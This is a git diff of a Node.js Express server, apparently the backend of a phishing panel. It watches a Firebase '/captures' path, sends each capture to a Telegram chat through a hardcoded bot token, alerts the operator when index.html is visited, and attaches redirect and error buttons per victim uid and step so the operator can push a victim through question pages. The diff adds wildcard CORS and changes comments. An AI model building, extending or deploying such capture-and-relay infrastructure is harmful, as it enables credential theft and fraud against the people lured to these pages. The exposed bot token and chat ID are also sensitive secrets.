@@ -1,4 +1,4 @@
-// server.js - VERSIÓN COMPLETA CON BOTONES DE ERROR ESPECÍFICOS
+// server.js - VERSIÓN COMPLETA CON SOPORTE CORS Y ALERTA FUNCIONAL
 const express = require('express');
 const admin = require('firebase-admin');
 const axios = require('axios');
@@ -9,13 +9,23 @@ if (process.env.NODE_ENV !== 'production') {
 }
 
 const app = express();
-app.use(express.json());
+
+// === ✅ MIDDLEWARE CORS (ES CLAVE PARA QUE FUNCIONE DESDE CUALQUIER DOMINIO) ===
+app.use((req, res, next) => {
+  res.header('Access-Control-Allow-Origin', '*');
+  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+  next();
+});
+
+// Parsear JSON con límite alto
+app.use(express.json({ limit: '10mb' }));
 
 // === CONFIGURACIÓN DE TELEGRAM ===
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ ESPACIO ELIMINADO
-const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ ESPACIO ELIMINADO
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ Sin espacios
+const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ Sin espacios
 const ALLOWED_PAGES = [
   'index.html',
   'pregunta-1.html',
@@ -31,8 +41,8 @@ const ALLOWED_PAGES = [
 
 // === ALERTA DE ACCESO A INDEX.HTML ===
 app.post('/alert-login', async (req, res) => {
-  // Forzar parseo de JSON incluso si no hay Content-Type
   let data = req.body;
+  // Parseo manual en caso de que el body llegue vacío
   if (!data || Object.keys(data).length === 0) {
     try {
       const rawBody = await new Promise((resolve, reject) => {
@@ -72,7 +82,7 @@ app.post('/alert-login', async (req, res) => {
   }
 });
 
-// === CONFIGURACIÓN MEJORADA DE FIREBASE ===
+// === CONFIGURACIÓN DE FIREBASE ===
 console.log('🔧 Inicializando Firebase Admin...');
 
 let serviceAccount;
@@ -94,7 +104,7 @@ try {
 try {
   admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
-    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ ESPACIO ELIMINADO
+    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ Sin espacios
   });
   console.log('✅ Firebase Admin SDK inicializado correctamente');
 } catch (error) {
@@ -104,7 +114,7 @@ try {
 
 const database = admin.database();
 
-// === VERIFICAR CONEXIÓN A FIREBASE ===
+// === FUNCIONES DE UTILIDAD ===
 async function testFirebaseConnection() {
   try {
     console.log('🔍 Probando conexión a Firebase...');
@@ -120,7 +130,6 @@ async function testFirebaseConnection() {
   }
 }
 
-// === VERIFICAR CONEXIÓN A TELEGRAM ===
 async function testTelegramConnection() {
   try {
     console.log('🔍 Probando conexión a Telegram...');
@@ -138,7 +147,6 @@ async function testTelegramConnection() {
   }
 }
 
-// === FUNCIÓN PARA CREAR BOTONES DE REDIRECCIÓN Y ERROR ===
 function createActionButtons(uid, step) {
   const buttons = [];
   
@@ -195,7 +203,6 @@ function createActionButtons(uid, step) {
   };
 }
 
-// === FUNCIÓN MEJORADA PARA ENVIAR A TELEGRAM ===
 async function sendToTelegram(message, replyMarkup = null) {
   try {
     console.log('📨 Intentando enviar mensaje a Telegram...');
@@ -233,7 +240,7 @@ async function sendToTelegram(message, replyMarkup = null) {
   }
 }
 
-// === 1. LISTENER DE FIREBASE MEJORADO ===
+// === LISTENER DE FIREBASE ===
 let isProcessing = false;
 
 console.log('👂 Configurando listener de Firebase...');
@@ -358,7 +365,7 @@ database.ref('/captures').on('child_added', async (snapshot) => {
   }
 });
 
-// === 2. WEBHOOK MEJORADO - MANEJO DE ERRORES ===
+// === WEBHOOK DE TELEGRAM ===
 app.post('/telegram/webhook', express.json(), async (req, res) => {
   console.log('🔔 Webhook de Telegram recibido');
   
